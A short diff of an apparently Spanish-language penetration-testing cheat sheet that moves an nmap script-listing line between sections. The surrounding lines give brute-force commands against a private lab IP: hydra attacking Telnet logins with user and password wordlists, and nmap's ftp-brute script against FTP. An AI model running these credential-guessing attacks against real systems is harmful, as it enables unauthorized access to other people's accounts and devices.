@@ -12,14 +12,14 @@ echo "admin" > usuarios.txt
 # Ataque TELNET
 ## NMAP
 ```bash
-ls /usr/share/nmap/scripts/
-```
-```bash
 hydra -L usuarios.txt -P diccionario.txt telnet://192.168.85.134
 ```
 # Ataque FTP
 ```bash
 nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=diccionario.txt 192.168.85.134
+```
+```bash
+ls /usr/share/nmap/scripts/
 ```
 # Winbox/API Mikrotik
 ```bash
